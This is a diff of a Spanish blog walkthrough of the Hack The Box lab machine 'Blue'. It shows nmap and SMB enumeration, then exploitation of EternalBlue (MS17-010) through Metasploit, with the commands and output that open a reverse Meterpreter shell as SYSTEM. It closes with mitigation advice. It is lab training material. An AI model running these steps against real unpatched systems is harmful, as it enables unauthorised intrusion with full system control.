@@ -1,65 +1,68 @@
 ---
-title: "HTB Write-up: Blue"
+title: "HTB Walkthrough: Blue"
 date: 2026-03-28
 draft: false
-description: "Write-up de la máquina Blue de Hack The Box. Dificultad Easy con OS Windows 7 SP1. Explotación del famoso EternalBlue (MS17-010) mediante Metasploit para obtener acceso directo como SYSTEM."
-tags: ["HackTheBox", "Windows", "Easy", "EternalBlue", "MS17-010", "Metasploit", "SMB", "RCE"]
+description: "Walkthrough completo de la máquina Blue de Hack The Box. Dificultad Easy, OS Windows 7 SP1. Explotación de EternalBlue (MS17-010) mediante Metasploit para obtener acceso directo como NT AUTHORITY\\SYSTEM."
+tags: ["HackTheBox", "Windows", "Easy", "EternalBlue", "MS17-010", "Metasploit", "SMB", "RCE", "blue", "writeups"]
 categories: ["HTB Walkthroughs"]
 series: ["HackTheBox CPTS"]
 ---
 
 {{< lead >}}
-Resolución de **Blue**, otra máquina icónica de Hack The Box. Dificultad **Easy** con OS **Windows 7 SP1**. El vector es el infame exploit **EternalBlue** (MS17-010), una vulnerabilidad en SMBv1 que compromete el kernel de Windows y nos entrega acceso directo como **NT AUTHORITY\SYSTEM**.
+Resolución de **Blue** en Hack The Box. Máquina de dificultad **Easy** con sistema operativo **Windows 7 SP1**. El vector es el infame exploit **EternalBlue** (MS17-010), una vulnerabilidad en SMBv1 que compromete el kernel de Windows y entrega acceso directo como **NT AUTHORITY\SYSTEM** sin necesidad de credenciales.
 {{< /lead >}}
 
 {{< badge >}}HackTheBox{{< /badge >}}
 {{< badge >}}Windows{{< /badge >}}
 {{< badge >}}Easy{{< /badge >}}
 
+> ⚠️ **Esta máquina está retirada.** Los writeups públicos solo están permitidos sobre máquinas retiradas según las [normas de la comunidad HTB](https://help.hackthebox.com/en/articles/5188925-streaming-writeups-walkthrough-guidelines).
+
 ---
 
 ## 🗺️ Información de la Máquina
 
-| Campo          | Detalle                                         |
-|----------------|-------------------------------------------------|
-| **Nombre**     | Blue                                            |
-| **OS**         | Windows 7 Professional SP1 (x64)               |
-| **Dificultad** | Easy                                            |
-| **IP**         | 10.129.10.54                                    |
-| **Técnicas**   | SMB Enumeration, EternalBlue, Kernel Exploit    |
-| **CVE / MS**   | MS17-010 (CVE-2017-0144)                        |
+| Campo          | Detalle                                                    |
+|----------------|------------------------------------------------------------|
+| **Nombre**     | Blue                                                       |
+| **OS**         | Windows 7 Professional SP1 (x64)                          |
+| **Dificultad** | Easy                                                       |
+| **IP**         | 10.129.10.54                                               |
+| **Técnicas**   | SMB Enumeration · EternalBlue · Kernel Exploit             |
+| **CVE / MS**   | MS17-010 (CVE-2017-0144)                                   |
 
 ---
 
-## 📑 1. Reconocimiento
+## 1. Reconocimiento
 
-El objetivo es identificar la versión exacta del SO y los servicios expuestos, ya que contra Windows el detalle importa: una diferencia de Service Pack o de arquitectura puede hacer que un exploit no funcione.
-
-### Escaneo de Puertos y Versiones
+### 1.1 Escaneo de Puertos
 
 ```bash
-┌─[root@htb]─[~]
-└──╼ #nmap -sV 10.129.10.54
-PORT      STATE SERVICE      VERSION
-135/tcp   open  msrpc        Microsoft Windows RPC
-139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
-445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds
-49152/tcp open  msrpc        Microsoft Windows RPC
-... (puertos RPC adicionales)
-Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
+nmap -p- --open -sS --min-rate 5000 -n -Pn 10.129.10.54
 ```
 
-Los puertos **135, 139 y 445** son el patrón característico de un sistema Windows con el stack de NetBIOS y SMB expuesto. El nombre del host `HARIS-PC` nos indica que es probablemente una máquina de escritorio, no un servidor corporativo hardened.
+```
+PORT      STATE SERVICE
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+445/tcp   open  microsoft-ds
+49152/tcp open  msrpc
+49153/tcp open  msrpc
+49154/tcp open  msrpc
+```
 
-### Identificación Precisa del Sistema Operativo
-
-El flag `-sV` nos da el servicio pero no la versión exacta de Windows. Usamos `-sC` (scripts por defecto de Nmap) sobre el puerto 445 para extraer el detalle completo mediante el script `smb-os-discovery`.
+Escaneo de versiones sobre los puertos relevantes:
 
 ```bash
-┌─[root@htb]─[~]
-└──╼ #nmap -sC 10.129.10.54 -p 445
-PORT    STATE SERVICE
-445/tcp open  microsoft-ds
+nmap -sC -sV -p135,139,445 10.129.10.54
+```
+
+```
+PORT    STATE SERVICE      VERSION
+135/tcp open  msrpc        Microsoft Windows RPC
+139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds
+
 Host script results:
 | smb-os-discovery:
 |   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
@@ -68,135 +71,143 @@ Host script results:
 |_  System time: 2026-03-28T15:00:03+00:00
 ```
 
-**Análisis:** Confirmado — **Windows 7 Professional SP1 x64**. Esta versión es críticamente vulnerable a **EternalBlue (MS17-010)** si no tiene el parche de seguridad aplicado, lo cual en HTB podemos asumir. Microsoft lanzó el parche en marzo de 2017, pero esta máquina permanece sin parchear como objetivo de laboratorio.
+*Puertos abiertos:*
+- `135, 139, 445` → Stack SMB/NetBIOS de Windows — patrón clásico de sistema Windows con recursos compartidos expuestos
+- `49152+` → Puertos dinámicos RPC (Microsoft EPMAP)
 
----
+> **💡 Dato clave:** El script `smb-os-discovery` confirma **Windows 7 Professional SP1 x64**. Esta versión es vulnerable a MS17-010 si no tiene el parche KB4012212 aplicado. El nombre de host `haris-PC` sugiere una máquina de escritorio, no un servidor hardened.
 
-## 📂 2. Enumeración SMB
+### 1.2 Enumeración SMB
 
-Antes de lanzar el exploit, confirmamos el nivel de acceso que tenemos sobre los recursos compartidos. Esto nos ayuda a entender si hay alguna vía alternativa (por ejemplo, archivos con credenciales) y a verificar que SMBv1 está activo.
-
-### Listado de Recursos Compartidos
+Antes de explotar nada, enumeramos los recursos compartidos para entender la superficie expuesta:
 
 ```bash
-┌─[root@htb]─[~]
-└──╼ #smbclient -N -L //10.129.10.54
-
-    Sharename       Type      Comment
-    ---------       ----      -------
-    ADMIN$          Disk      Remote Admin
-    C$              Disk      Default share
-    IPC$            IPC       Remote IPC
-    Share           Disk
-    Users           Disk
+smbclient -N -L //10.129.10.54
 ```
 
-Los recursos son visibles sin autenticación (`-N` = null session), pero `smbmap` nos confirma que no tenemos permisos de lectura o escritura directos sobre ninguno de ellos:
+```
+Sharename       Type      Comment
+---------       ----      -------
+ADMIN$          Disk      Remote Admin
+C$              Disk      Default share
+IPC$            IPC       Remote IPC
+Share           Disk
+Users           Disk
+```
+
+Los shares son visibles mediante null session (`-N`), pero `smbmap` confirma que no tenemos permisos de lectura ni escritura sin credenciales:
 
 ```bash
+smbmap -H 10.129.10.54
+```
+
+```
 [!] Access denied on 10.129.10.54, no fun for you...
 ```
 
 Sin credenciales válidas no podemos acceder a los archivos. El único camino es explotar la vulnerabilidad del servicio en sí.
 
+> **💡 Conclusiones:** SMBv1 activo, Windows 7 SP1 sin parchear, puerto 445 accesible. Todos los requisitos para MS17-010 están presentes.
+
 ---
 
-## 💥 3. Explotación — EternalBlue (MS17-010)
+## 2. Explotación — MS17-010 EternalBlue
 
-### ¿Qué es EternalBlue?
+### 2.1 Análisis de la Vulnerabilidad
 
-**EternalBlue** es un exploit desarrollado por la NSA y filtrado públicamente por el grupo Shadow Brokers en abril de 2017. Explota una vulnerabilidad de **desbordamiento de búfer en el pool no paginado del kernel de Windows** al procesar paquetes **SMBv1** especialmente diseñados.
+**EternalBlue** es un exploit desarrollado por la NSA y filtrado públicamente por el grupo Shadow Brokers en abril de 2017. Explota un **desbordamiento de buffer en el pool no paginado del kernel de Windows** al procesar paquetes SMBv1 malformados.
 
-El proceso ocurre así:
-1. El atacante envía un paquete SMBv1 malformado al puerto 445.
-2. El kernel de Windows no valida correctamente el tamaño del buffer al procesarlo.
-3. Se sobreescribe memoria del kernel, permitiendo la inyección de shellcode.
-4. El shellcode se ejecuta con privilegios de **SYSTEM** porque el proceso `srv.sys` corre en modo kernel.
-
-No es necesario tener credenciales previas. Si el puerto 445 es accesible y SMBv1 está habilitado, la máquina es vulnerable.
-
-### Configuración del Exploit en Metasploit
-
-```bash
-[msf](Jobs:0 Agents:0) >> search Windows 2017 blue
-[msf](Jobs:0 Agents:0) >> use exploit/windows/smb/ms17_010_eternalblue
-[msf](Jobs:0 Agents:0) >> set RHOSTS 10.129.10.54
-[msf](Jobs:0 Agents:0) >> set LHOST tun0
-LHOST => 10.10.15.237
+```
+Flujo normal:    paquete SMBv1 → srv.sys valida el buffer → procesa la petición
+Flujo malicioso: paquete SMBv1 malformado → srv.sys no valida el tamaño → overflow en kernel
+                 → inyección de shellcode → ejecución como SYSTEM
 ```
 
-El módulo `ms17_010_eternalblue` es el puerto oficial de Metasploit del exploit. El payload por defecto crea una sesión **Meterpreter** de 64 bits, adecuada para la arquitectura x64 del objetivo.
+La razón por la que entregamos SYSTEM directamente es que `srv.sys` — el driver que gestiona SMB — corre en **modo kernel**. No hay necesidad de escalada de privilegios posterior. Si el puerto 445 es accesible y SMBv1 está habilitado, la máquina es vulnerable independientemente de las credenciales del atacante.
 
-### Ejecución
+### 2.2 Configuración del Exploit en Metasploit
 
 ```bash
-[msf](Jobs:0 Agents:0) >> run
+msf6 > use exploit/windows/smb/ms17_010_eternalblue
+msf6 exploit(ms17_010_eternalblue) > set RHOSTS 10.129.10.54
+msf6 exploit(ms17_010_eternalblue) > set LHOST tun0
+```
+
+El módulo usa por defecto el payload `windows/x64/meterpreter/reverse_tcp`, adecuado para la arquitectura x64 del objetivo.
+
+### 2.3 Ejecución
+
+```bash
+msf6 exploit(ms17_010_eternalblue) > run
+```
+
+```
 [*] Started reverse TCP handler on 10.10.15.237:4444
 [+] 10.129.10.54:445 - Host is likely VULNERABLE to MS17-010!
 [+] 10.129.10.54:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
 [*] Sending stage (244806 bytes) to 10.129.10.54
-[*] Meterpreter session 1 opened (10.10.15.237:4444 -> 10.129.10.27:49158)
+[*] Meterpreter session 1 opened (10.10.15.237:4444 -> 10.129.10.54:49158)
 ```
 
-La línea clave es `ETERNALBLUE overwrite completed successfully` — el kernel ha sido comprometido y el stage de Meterpreter ha sido inyectado en la memoria del proceso. La sesión se abre en segundos.
-
----
-
-## 🏁 4. Post-Explotación y Flags
-
-### Verificación de Privilegios
+La línea `ETERNALBLUE overwrite completed successfully` confirma que el kernel ha sido comprometido y el stage de Meterpreter ha sido inyectado en memoria. Verificamos privilegios:
 
 ```bash
-(Meterpreter 2)(C:\Windows\system32) > getuid
+meterpreter > getuid
 Server username: NT AUTHORITY\SYSTEM
 ```
 
-**NT AUTHORITY\SYSTEM** es el nivel de privilegio máximo en Windows, equivalente a `root` en Linux. No se requiere ningún paso de escalada de privilegios adicional — EternalBlue nos entrega el control total de la máquina desde el primer momento.
-
-### 🚩 User Flag (Haris)
-
-```bash
-(Meterpreter 2)(C:\Users\haris\Desktop) > cat user.txt
-```
-
-{{< spoiler text="user.txt" >}}
-`********************************`
-{{< /spoiler >}}
-
-### 👑 Root Flag (Administrator)
-
-```bash
-(Meterpreter 2)(C:\Users\Administrator\Desktop) > cat root.txt
-```
-
-{{< spoiler text="root.txt" >}}
-`********************************`
-{{< /spoiler >}}
+**NT AUTHORITY\SYSTEM** es el nivel de privilegio máximo en Windows, equivalente a `root` en Linux. No se requiere ningún paso adicional de escalada.
 
 ---
 
-## 📝 5. Resumen y Lecciones Aprendidas
+## 3. User Flag
+
+```bash
+meterpreter > cd C:\Users\haris\Desktop
+meterpreter > cat user.txt
+```
+
+> 🔑 Flag de usuario obtenida.
+
+---
+
+## 4. Root Flag
+
+No hay escalada de privilegios — EternalBlue entrega SYSTEM directamente. Accedemos al escritorio del Administrador:
+
+```bash
+meterpreter > cd C:\Users\Administrator\Desktop
+meterpreter > cat root.txt
+```
+
+> 🏁 Flag de root obtenida.
+
+---
+
+## 5. Resumen y Lecciones Aprendidas
 
 **Ruta de compromiso:**
-1. **Recon** → Nmap detecta Windows 7 SP1 con SMB (445) expuesto sin parchear.
-2. **Enumeración** → SMBv1 activo, acceso null session visible pero sin permisos de archivo.
-3. **Foothold** → MS17-010 con Metasploit (`ms17_010_eternalblue`) → shell directa como **SYSTEM**.
+
+1. **Recon** → Nmap + `smb-os-discovery` confirman Windows 7 SP1 x64 sin parchear con SMB expuesto.
+2. **Enumeración SMB** → SMBv1 activo, null session visible pero sin acceso a archivos.
+3. **MS17-010** → EternalBlue via Metasploit → desbordamiento en kernel → shell directa como **NT AUTHORITY\SYSTEM**.
+4. **Flags** → Sin escalada necesaria, acceso directo a ambos escritorios → `user.txt` + `root.txt`.
 
 **Lo que aprendí con esta máquina:**
-- La identificación precisa del SO (versión + SP + arquitectura) es crucial antes de seleccionar un exploit. La diferencia entre SP1 y sin SP puede determinar si funciona o no.
-- EternalBlue no requiere credenciales: el único requisito es que el puerto 445 sea accesible y SMBv1 esté habilitado.
-- Algunos exploits de nivel kernel entregan privilegios máximos sin necesidad de escalada — esto simplifica el proceso pero también muestra la gravedad de la vulnerabilidad.
-- Esta misma vulnerabilidad fue el vector inicial de **WannaCry** y **NotPetya**, dos de los ciberataques más destructivos de la historia.
 
----
+- **La identificación precisa del SO es crítica en Windows.** La diferencia de versión, Service Pack y arquitectura puede determinar si un exploit funciona o no. El script `smb-os-discovery` de Nmap extrae esta información directamente del protocolo SMB sin necesidad de credenciales.
 
-## 🛠️ 6. Mitigaciones (Hardening)
+- **EternalBlue no requiere credenciales — solo acceso al puerto 445 con SMBv1 activo.** Es una vulnerabilidad de nivel de red que afecta al kernel directamente. Esto lo diferencia de la mayoría de exploits, que requieren algún tipo de autenticación previa.
 
-| Problema                          | Recomendación                                                                                     |
-|-----------------------------------|---------------------------------------------------------------------------------------------------|
-| MS17-010 sin parchear             | Aplicar el boletín **MS17-010** (KB4012212). Es la defensa más crítica contra este vector.       |
-| SMBv1 habilitado                  | Deshabilitar SMBv1 completamente. Usar únicamente SMBv2 o SMBv3.                                 |
-| Windows 7 sin soporte             | EOL desde enero de 2020. Migrar a un SO con soporte activo (Windows 10/11 o Windows Server).     |
-| SMB expuesto a toda la red        | Segmentar la red y bloquear el puerto 445 desde el exterior. Aislar máquinas legacy.             |
+- **Un exploit de nivel kernel entrega el máximo privilegio desde el primer momento.** En Windows, `srv.sys` corre en modo kernel, así que cualquier código inyectado a través de él hereda ese contexto — SYSTEM sin pasos adicionales. Esto muestra por qué las vulnerabilidades de kernel son las más graves.
 
-> **Nota histórica:** EternalBlue fue el motor detrás de **WannaCry** (mayo 2017) y **NotPetya** (junio 2017), que infectaron cientos de miles de sistemas en horas. A pesar del parche disponible desde marzo de 2017, muchas organizaciones no lo habían aplicado cuando ocurrieron los ataques.
+- **EternalBlue fue el vector inicial de WannaCry y NotPetya.** Ambos ataques ocurrieron en 2017, semanas después de que el parche estuviera disponible, y afectaron a cientos de miles de sistemas. El tiempo entre la publicación de un parche y su aplicación masiva es la ventana que explotan los atacantes a escala global.
+
+**Mitigaciones:**
+
+| Vector | Mitigación |
+|--------|------------|
+| MS17-010 sin parchear | Aplicar el boletín MS17-010 (KB4012212) — defensa más crítica contra este vector |
+| SMBv1 habilitado | Deshabilitar SMBv1 completamente; usar únicamente SMBv2 o SMBv3 |
+| Windows 7 sin soporte (EOL enero 2020) | Migrar a un SO con soporte activo (Windows 10/11 o Windows Server moderno) |
+| Puerto 445 expuesto en la red | Segmentar la red y bloquear el 445 desde el exterior; aislar máquinas legacy en VLANs separadas |
